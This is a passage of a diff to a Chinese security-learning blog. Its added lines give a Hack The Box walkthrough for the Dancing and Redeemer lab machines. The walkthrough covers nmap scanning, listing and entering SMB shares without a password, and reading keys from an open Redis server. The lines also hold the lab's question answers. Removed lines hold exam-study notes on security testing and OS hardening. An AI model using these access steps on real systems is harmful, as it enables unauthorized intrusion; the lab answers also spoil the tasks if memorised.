+<p>-L</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.129.125.72</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\zyu]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        WorkShares      Disk</span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.129.125.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>
+<p>SMB 的 445/tcp 端口已启动并运行，它就像一个共享文件夹。我们可以使用命令 smbclient -L {targetIP} 来枚举其内容。</p>
+<p>5.How many shares are there on Dancing?</p>
+<p>Dancing 有多少共享文件夹？</p>
+<p>4</p>
+<p>6.What is the name of the share we are able to access in the end with a blank password?</p>
+<p>最后，我们不用密码就能访问哪个共享文件夹？</p>
+<p>WorkShares</p>
+<p>7.What is the command we can use within the SMB shell to download the files we find?</p>
+<p>在 SMB shell 中，我们可以使用什么命令来下载找到的文件？</p>
+<p>get</p>
+<p>8.get flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.129.125.72\\WorkShares</span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> James.P</span><br><span class="line">smb: \James.P\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Thu Jun  3 04:38:03 2021</span><br><span class="line">  ..                                  D        0  Thu Jun  3 04:38:03 2021</span><br><span class="line">  flag.txt                            A       32  Mon Mar 29 05:26:57 2021</span><br><span class="line"></span><br><span class="line">                5114111 blocks of size 4096. 1750562 blocks available</span><br><span class="line">smb: \James.P\&gt; get flag.txt</span><br><span class="line">getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span><br><span class="line">smb: \James.P\&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<h1 id="Redeemer"><a href="#Redeemer" class="headerlink" title="Redeemer"></a>Redeemer</h1><p>默认情况下，Nmap 在正式扫描端口之前，会先向目标发一个 Ping 包（ICMP 请求）。如果目标有回应，Nmap 才会继续扫端口；如果没有回应，Nmap 为了节省时间，会直接认为机器“没开机”，从而直接结束扫描。HTB 里的很多靶机（尤其是 Windows 机器）默认开启了防火墙，会拦截并丢弃所有的 Ping 请求。</p>
+<p>👉 解决方法：听从 Nmap 的建议，加上 -Pn 参数。</p>
+<p>-Pn 的意思是：“跳过主机存活检测（不发 Ping），无脑假设目标是开机的，直接强行扫它的端口。”</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap 10.129.125.73</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 03:01 EDT</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (0 hosts up) scanned <span class="keyword">in</span> 3.08 seconds</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> nmap -Pn 10.129.125.73</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 03:02 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.125.73)</span><br><span class="line">Host is up.</span><br><span class="line">All 1000 scanned ports on localhost (10.129.125.73) are <span class="keyword">in</span> ignored states.</span><br><span class="line">Not shown: 1000 filtered tcp ports (no-response)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 201.43 seconds</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> nmap -p 6379 -sCV 10.129.125.73</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 03:15 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.125.73)</span><br><span class="line">Host is up (0.31s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">6379/tcp open  redis   Redis key-value store 5.0.7</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.21 seconds</span><br></pre></td></tr></table></figure>
+<p>1.Which TCP port is open on the machine?</p>
+<p>机器上哪个 TCP 端口是开放的？</p>
+<p>6379</p>
+<p>2.Which service is running on the port that is open on the machine?</p>
+<p>机器上打开的端口正在运行哪个服务？</p>
+<p>redis</p>
+<p>3.What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database</p>
+<p>Redis 是什么类型的数据库？请从以下选项中选择：（i）内存数据库，（ii）传统数据库</p>
+<p>In-memory Database</p>
+<p>4.Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.</p>
+<p>哪个命令行工具用于与 Redis 服务器交互？请输入您在终端中输入的程序名称（不带任何参数）。</p>
+<p>redis-cli</p>
+<p>5.Which flag is used with the Redis command-line utility to specify the hostname?</p>
+<p>在 Redis 命令行工具中，使用哪个标志来指定主机名？</p>
+<p>-h</p>
+<p>6.Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?</p>
+<p>连接到 Redis 服务器后，使用哪个命令可以获取有关 Redis 服务器的信息和统计信息？</p>
+<p>info</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.129.125.73</span><br><span class="line">10.129.125.73:6379&gt; info</span><br><span class="line"><span class="comment"># Server</span></span><br><span class="line">redis_version:5.0.7</span><br><span class="line">redis_git_sha1:00000000</span><br><span class="line">redis_git_dirty:0</span><br><span class="line">redis_build_id:66bd629f924ac924</span><br><span class="line">redis_mode:standalone</span><br><span class="line">os:Linux 5.4.0-77-generic x86_64</span><br><span class="line">arch_bits:64</span><br><span class="line">multiplexing_api:epoll</span><br><span class="line">atomicvar_api:atomic-builtin</span><br><span class="line">gcc_version:9.3.0</span><br><span class="line">process_id:756</span><br><span class="line">run_id:b9ba300da3b4f92a5a8af4ab844c8b05d21460aa</span><br><span class="line">tcp_port:6379</span><br><span class="line">uptime_in_seconds:2356</span><br><span class="line">uptime_in_days:0</span><br><span class="line">hz:10</span><br><span class="line">configured_hz:10</span><br><span class="line">lru_clock:99981</span><br><span class="line">executable:/usr/bin/redis-server</span><br><span class="line">config_file:/etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>7.What is the version of the Redis server being used on the target machine?</p>
+<p>目标机器上使用的 Redis 服务器版本是什么？</p>
+<p>5.0.7</p>
+<p>8.Which command is used to select the desired database in Redis?</p>
+<p>在 Redis 中，使用哪个命令来选择所需的数据库？</p>
+<p>select</p>
+<p>9.How many keys are present inside the database with index 0?</p>
+<p>数据库中索引为 0 的数据库键有多少个？</p>
+<p>4</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">10.129.125.73:6379&gt; <span class="keyword">select</span> 0</span><br><span class="line">OK</span><br><span class="line">(0.70s)</span><br><span class="line">10.129.125.73:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;numb&quot;</span></span><br><span class="line">2) <span class="string">&quot;temp&quot;</span></span><br><span class="line">3) <span class="string">&quot;stor&quot;</span></span><br><span class="line">4) <span class="string">&quot;flag&quot;</span></span><br><span class="line">(3.83s)</span><br><span class="line">10.129.125.73:6379&gt; get flag</span><br></pre></td></tr></table></figure>
+<p>10.Which command is used to obtain all the keys in a database?</p>
+<p>哪个命令可以用来获取数据库中的所有键？</p>
+<p>keys *</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -2228,635 +2881,8 @@ mjx-container[display="true"] + br {
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/03/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/kehan.jpg">
-      <meta itemprop="name" content="Aono">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aono Note">
-      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Aono Note">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/03/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">网络安全测评技术</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-03-08 22:46:52 / 修改时间：22:50:00" itemprop="dateCreated datePublished" datetime="2026-03-08T22:46:52+08:00">2026-03-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="网络安全测评技术"><a href="#网络安全测评技术" class="headerlink" title="网络安全测评技术"></a>网络安全测评技术</h2><h3 id="一、-网络安全测评概况"><a href="#一、-网络安全测评概况" class="headerlink" title="一、 网络安全测评概况"></a>一、 网络安全测评概况</h3><ul>
-<li><strong>测评概念</strong>：参照一定的标准规范要求，通过一系列的技术和管理方法，获取评估对象的网络安全状况信息，对其给出相应的网络安全情况综合判定。</li>
-<li><strong>测评对象</strong>：对象通常包括信息系统的组成要素或信息系统自身。</li>
-</ul>
-<h3 id="二、-网络安全测评类型"><a href="#二、-网络安全测评类型" class="headerlink" title="二、 网络安全测评类型"></a>二、 网络安全测评类型</h3><p>网络安全测评可以从四个维度进行分类：</p>
-<p><strong>1. 按照“测评目标”分类</strong></p>
-<ul>
-<li><strong>网络信息系统安全等级测评</strong>：按照有关管理规范和技术标准，对非涉及国家秘密的网络信息系统的安全等级保护状况进行检测评估。<ul>
-<li><em>核心内容</em>：检测和评估信息系统在安全技术、安全管理等方面是否符合已确定的安全等级的要求；对于尚未符合要求的信息系统，分析和评估其潜在威胁、薄弱环节以及现有安全防护措施，综合考虑信息系统的重要性和面临的安全威胁等因素，提出相应的整改建议，并在系统整改后进行复测确认，以确保网络信息系统的安全保护措施符合相应安全等级的基本安全要求。目前，采用网络安全等级保护2.0标准。</li>
-</ul>
-</li>
-<li><strong>网络信息系统安全验收测评</strong>：根据用户申请的项目验收目标和验收范围，结合项目安全建设方案的实现目标和考核指标，对项目实施状况进行安全测试和评估，评价该项目是否满足安全验收要求中的各项安全技术指标和安全考核目标。</li>
-<li><strong>网络信息系统安全风险测评</strong>：从风险管理角度，评估系统面临的威胁以及脆弱性导致安全事件的可能性，并结合安全事件所涉及的资产价值来判断安全事件一旦发生对系统造成的影响，提出有针对性的抵御威胁的方法措施，将风险控制在可接受的范围内。<ul>
-<li><em>实施范围</em>：从技术和管理两方面进行，包括系统调查、资产分析、威胁分析、技术及管理脆弱性分析、安全功能测试、风险分析等。</li>
-</ul>
-</li>
-</ul>
-<p><strong>2. 按照“测评内容”分类</strong></p>
-<ul>
-<li><strong>技术安全测评</strong> 和 <strong>管理安全测评</strong>。</li>
-</ul>
-<p><strong>3. 按照“实施方式”分类</strong></p>
-<ul>
-<li><strong>安全功能检测</strong>：对安全功能实现状况进行评估，检查安全功能是否满足目标和设计要求（方法包含：访谈调研、现场查看、文档审查、社会工程、漏洞扫描、渗透测试、形式化分析验证）。</li>
-<li><strong>安全管理检测</strong>：检查分析管理要素及机制的安全状况（方法包含：访谈调研、现场查看、文档审查、安全基线对比、社会工程）。</li>
-<li><strong>代码安全审查</strong>：排查可能导致安全问题的编码缺陷和漏洞。</li>
-<li><strong>安全渗透测试</strong>：模拟黑客。</li>
-<li><strong>信息系统攻击测试</strong>：对应用系统的抗攻击能力进行测试（主要考察防御攻击的种类与能力）。</li>
-</ul>
-<p><strong>4. 按照“测评对象保密性”分类</strong></p>
-<ul>
-<li><strong>涉密信息系统测评</strong>：对涉密信息系统所面临的威胁及其存在的脆弱性进行分析。</li>
-<li><strong>非涉密信息系统测评</strong>：综合给出网络安全状况评估和改进建议。</li>
-</ul>
-<h3 id="三、-网络安全测评流程与内容"><a href="#三、-网络安全测评流程与内容" class="headerlink" title="三、 网络安全测评流程与内容"></a>三、 网络安全测评流程与内容</h3><p><strong>1. 等级保护测评（等保）</strong></p>
-<ul>
-<li><strong>测评内容</strong>：<ul>
-<li><strong>技术安全测评</strong>：涵盖安全物理环境、安全通信网络、安全区域边界、安全计算环境、安全管理中心。</li>
-<li><strong>管理安全测评</strong>：涵盖安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理。</li>
-</ul>
-</li>
-<li><strong>测评流程</strong>：包括测评准备活动、方案编制活动、现场测评活动和报告编制活动。</li>
-</ul>
-<p><strong>2. 渗透测试（分为五个阶段）</strong></p>
-<ul>
-<li><strong>委托受理</strong>：进行前期沟通，双方签署保密协议以及网络信息系统渗透测试合同。</li>
-<li><strong>准备阶段</strong>：依据客户提供的文档资料和调查数据，编写制定网络信息系统渗透测试方案；确定测试日期、客户方配合的人员；填写网络信息系统渗透测试用户授权单。</li>
-<li><strong>实施阶段</strong>：明确项目组测试人员承担的测试项；测试完成后输出网络信息系统渗透测试报告。</li>
-<li><strong>综合评估</strong>：项目组和客户沟通测试结果，必要时进行评审；如需复测，依据网络信息系统渗透测试整改报告执行。</li>
-<li><strong>结题阶段</strong>：将过程记录进行整理；并邀请客户填写客户满意度调查表。</li>
-</ul>
-<h3 id="四、-网络安全测评技术与工具"><a href="#四、-网络安全测评技术与工具" class="headerlink" title="四、 网络安全测评技术与工具"></a>四、 网络安全测评技术与工具</h3><ul>
-<li><strong>漏洞扫描</strong>：获取测评对象的安全漏洞信息（常见工具包括：网络安全漏洞扫描器、主机安全漏洞扫描器、数据库安全漏洞扫描器、Web应用安全漏洞扫描器）。</li>
-<li><strong>安全渗透测试</strong>：模拟攻击者对测评对象进行安全攻击。按掌握信息程度分为：<ul>
-<li><strong>黑盒模型</strong></li>
-<li><strong>白盒模型</strong>：需要提供尽可能详细的测试对象信息，据此制订特殊的渗透方案，对系统进行高级别的安全测试。</li>
-<li><strong>灰盒模型</strong>：需要提供部分测试对象信息，模拟不同级别的威胁者进行渗透。</li>
-</ul>
-</li>
-<li><strong>代码安全审查</strong>：对测评对象的源代码或二进制代码进行安全符合性检查。</li>
-<li><strong>协议分析</strong>：用于检测协议的安全性。</li>
-<li><strong>性能测试</strong>：评估测评对象的性能状况，检查测评对象的承载性能压力或安全对性能的影响。</li>
-</ul>
-<h3 id="五、-网络安全测评质量管理与标准"><a href="#五、-网络安全测评质量管理与标准" class="headerlink" title="五、 网络安全测评质量管理与标准"></a>五、 网络安全测评质量管理与标准</h3><ul>
-<li><strong>管理意义</strong>：质量管理是测评可信的基础性工作。</li>
-<li><strong>管理内容</strong>：包括测评机构建立质量管理体系、测评实施人员管理、测评实施设备管理、测评实施方法管理、测评实施文件控制、测评非符合性工作控制、体系运行监督、持续改进。</li>
-<li><strong>参考标准</strong>：国际标准是 ISO 9000。</li>
-<li><strong>认证机构</strong>：中国合格评定国家认可委员会（简称 CNAS）。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/03/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/kehan.jpg">
-      <meta itemprop="name" content="Aono">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aono Note">
-      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Aono Note">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/03/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" class="post-title-link" itemprop="url">操作系统安全</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-03-08 22:46:40 / 修改时间：22:50:11" itemprop="dateCreated datePublished" datetime="2026-03-08T22:46:40+08:00">2026-03-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="操作系统安全"><a href="#操作系统安全" class="headerlink" title="操作系统安全"></a>操作系统安全</h2><p>文档记录了<strong>操作系统安全保护</strong>，涵盖了操作系统安全的基础理论，并分别针对 Windows、UNIX/Linux 以及国产操作系统的安全架构、面临的威胁及安全加固方案进行了深入剖析。</p>
-<h3 id="一、-操作系统安全概述"><a href="#一、-操作系统安全概述" class="headerlink" title="一、 操作系统安全概述"></a>一、 操作系统安全概述</h3><ul>
-<li><strong>安全概念</strong>：是指<strong>满足安全策略要求，具有相应的安全机制及安全功能，符合特定的安全标准，在一定约束条件下，能够抵御常见的网络安全威胁，保障自身的安全运行及资源安全</strong>。<ul>
-<li>操作系统分为五个安全等级：用户自主保护级、系统审计保护级、安全标记保护级、结构化保护级、访问验证保护级。</li>
-</ul>
-</li>
-<li><strong>安全可控目标</strong>：<strong>用户可以按照预期的安全要求，实现对操作系统的操作和控制</strong>。<ul>
-<li>技术层面：给定一个操作系统，<strong>用户能够实现对操作系统的可理解、可修改、可检测、可修复、可保护</strong>。</li>
-<li>商业层面：用户能主导产品化，<strong>不能被利用危及国家安全</strong>。</li>
-</ul>
-</li>
-<li><strong>核心安全机制</strong>：<ul>
-<li><strong>硬件安全</strong>、<strong>标识与鉴别</strong>（防止伪造验证身份）、<strong>访问控制</strong>、<strong>最小特权管理</strong>、<strong>可信路径</strong>（防木马窃听的通信路径）、<strong>安全审计</strong>、<strong>系统安全增强</strong>。</li>
-</ul>
-</li>
-</ul>
-<h3 id="二、-Windows-操作系统安全分析与防护"><a href="#二、-Windows-操作系统安全分析与防护" class="headerlink" title="二、 Windows 操作系统安全分析与防护"></a>二、 Windows 操作系统安全分析与防护</h3><ul>
-<li><strong>系统架构与安全子系统</strong>：Windows 架构是<strong>层次结构和客户机/服务器结构的混合体</strong>（分硬件抽象层、<strong>内核层</strong>、<strong>基本系统服务模块</strong>）。安全子系统主要由 <strong>LSA（本地安全授权）</strong>、<strong>SAM（安全账户管理）</strong> 和 <strong>SRM（安全参考监视器）</strong>组成。<ul>
-<li>SAM 提供<strong>用户登录认证</strong>，并为用户赋予<strong>安全标识符 (SID)</strong>。</li>
-<li>SRM 负责<strong>访问控制和审查策略</strong>，通过 <strong>ACL（访问控制列表）</strong> 描述客体权限。</li>
-</ul>
-</li>
-<li><strong>安全机制</strong>：<ul>
-<li>认证机制分为<strong>本地认证和网络认证</strong>（集成 Kerberos V5、公钥证书和 NTLM）。</li>
-<li>访问控制达到了<strong>C2级</strong>，实现<strong>用户级自主访问控制</strong>（基于安全性描述符）。</li>
-<li>日志分为：<strong>系统日志、应用程序日志和安全日志</strong>。分别对应SysEvent.evt / AppEvent.evt / SecEvent.evt；</li>
-</ul>
-</li>
-<li><strong>抗攻击机制（Win7/Win10新增）</strong>：<ul>
-<li>增加<strong>抗攻击安全机制，集成了内存保护机制</strong>（SafeSEH、DEP、ASLR 等）。</li>
-<li>Win10 提供<strong>减少攻击面规则配置</strong>（如：<strong>阻止所有 Office 应用程序创建子进程</strong>、<strong>阻止 JavaScript/VBScript 启动下载</strong>、<strong>防御勒索软件</strong>等）。</li>
-</ul>
-</li>
-<li><strong>安全加固最佳实践</strong>：<ul>
-<li><strong>确认系统安全增强的安全目标和系统的业务用途</strong>。</li>
-<li><strong>安装最小化的操作系统</strong>（减少安全隐患数目，难以顾及）。</li>
-<li><strong>配置安装的系统服务</strong>（<strong>不要安装与系统业务运行无关的网络/系统服务和应用程序</strong>）。</li>
-<li><strong>配置安全策略</strong>、<strong>禁用 NetBIOS</strong>（封堵 135-139, 445端口）、<strong>账户/文件系统安全配置</strong>（<strong>删除不必要的帮助文件/应用程序，启用加密文件系统</strong>）。</li>
-<li><strong>配置 TCP/IP 筛选</strong>、<strong>禁用光盘或软盘启动</strong>、<strong>使用屏幕保护口令</strong>。</li>
-</ul>
-</li>
-</ul>
-<h3 id="三、-UNIX-Linux-操作系统安全分析与防护"><a href="#三、-UNIX-Linux-操作系统安全分析与防护" class="headerlink" title="三、 UNIX/Linux 操作系统安全分析与防护"></a>三、 UNIX/Linux 操作系统安全分析与防护</h3><ul>
-<li><strong>系统架构与核心理念</strong>：分硬件层、系统内核、应用层。作为<strong>多用户、多任务</strong>系统，核心需求是<strong>不同用户之间避免相互干扰，禁止非授权访问系统资源</strong>。</li>
-<li><strong>安全机制</strong>：<ul>
-<li>认证：基于口令、终端认证、<strong>主机信任机制</strong>、<strong>第三方认证</strong>（S/Key、Kerberos、PAM）。</li>
-<li>访问控制：通过文件 ACL 实现，即<strong>常说的通过“9 bit”位来实现</strong>（属主、同组、其他用户的 r/w/x 权限）。</li>
-</ul>
-</li>
-<li><strong>安全威胁来源</strong>：<ul>
-<li><strong>口令信息保存在 passwd 和 shadow 文件中</strong>；可信主机文件（.rhost / hosts.equiv）；<strong>SUID 文件（带有文件拥有者身份和权限执行）</strong>。</li>
-</ul>
-</li>
-<li><strong>安全加固最佳实践</strong>：<ul>
-<li><strong>给安全漏洞打补丁</strong>（用 MD5Sum 验证完整性）。</li>
-<li><strong>最小化系统网络服务</strong>：<strong>尽量关闭不需要的服务和网络端口</strong>（将 inetd.conf 权限设为 600，属主为 root）。servlces文件权限设置为644，文件属主为root。</li>
-<li><strong>设置系统开机保护口令</strong>（防止通过<strong>特殊的组合键而无须提供用户名和口令进入系统</strong>）。</li>
-<li><strong>限制远程访问</strong>：通过 <strong><code>/etc/hosts.allow</code> 和 <code>/etc/hosts.deny</code></strong> 控制。</li>
-<li><strong>弱口令检查，默认账户禁用，tcp_wrapper增强访问控制，使用Tripwire和MD5Sum等完整性检查工具，检测LKM后门（Kstat、Chkrootkit、Rootkit Hunter）</strong></li>
-<li><strong>用户超时注销</strong>：在 <code>/etc/profile</code> 设置 <strong><code>TMOUT=600</code></strong>。</li>
-<li><strong>注销时删除命令记录</strong>：在 <code>.bash_logout</code> 中增加 <strong><code>rm -f $HOME/.bash_history</code></strong>。</li>
-</ul>
-</li>
-<li><strong>高级安全模块框架 (LSM)</strong>：<ul>
-<li><strong>Linux 安全模块 (LSM)</strong>：在<strong>内核源代码中放置钩子</strong>的方法。<strong>首先查找索引节点，进行错误检查和自主访问控制 (DAC)</strong>。</li>
-<li>代表实现：<strong>PAM</strong>（以<strong>“插件”增加新的身份验证服务</strong>）和 <strong>SELinux</strong>（基于策略和实施，包含<strong>类型实施、基于角色的访问控制和可选的多级别安全性</strong>）。</li>
-</ul>
-</li>
-</ul>
-<h3 id="四、-国产操作系统安全分析与防护"><a href="#四、-国产操作系统安全分析与防护" class="headerlink" title="四、 国产操作系统安全分析与防护"></a>四、 国产操作系统安全分析与防护</h3><ul>
-<li><strong>概况与威胁</strong>：由<strong>国家自主研发力量研制</strong>，具有较强可控性。多基于开源 Linux 定制，面临 <strong>Linux 内核的安全风险</strong>、<strong>自主研发系统组件的安全</strong>、<strong>依赖第三方系统组件的安全</strong>、<strong>系统安全配置的安全</strong>以及<strong>硬件的安全</strong>。</li>
-<li><strong>安全增强核心特性</strong>：<ul>
-<li>在<strong>自主可控、安全可信方面</strong>提供全方位保护，核心机制包括<strong>管理员分权、最小特权、结合角色的基于类型的访问控制、细粒度的自主访问控制、多级安全（即禁止上读下写）</strong>。</li>
-</ul>
-</li>
-<li><strong>典型产品实例</strong>：<ul>
-<li><strong>方舟安全操作系统</strong>：基于<strong>三权分立的管理机制</strong>（系统、安全、审计管理员相互制约）；<strong>强化的身份标识与认证机制</strong>（唯一标识，生命周期管理）；<strong>综合应用多种安全策略</strong>；<strong>基于内核层的安全审计（必须通过操作系统内核才能作用，不可绕过）</strong>。</li>
-<li><strong>中标麒麟安全/可信操作系统</strong>：基于 <strong>LSM 机制的 SELinux 安全子系统框架，提供三权分立机制权限集管理功能和统一的安全管理中心 SMC</strong>。</li>
-<li>结合可信计算，通过<strong>信任链的建立及传递</strong>实现度量。支持<strong>国内可信计算规范 (TCM/TPCM、TPM2.0)</strong> 及<strong>国家密码管理部门发布的 SM2、SM3、SM4 等国密算法</strong>，提供<strong>可持续性的安全保障</strong>。</li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/03/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/kehan.jpg">
-      <meta itemprop="name" content="Aono">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aono Note">
-      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
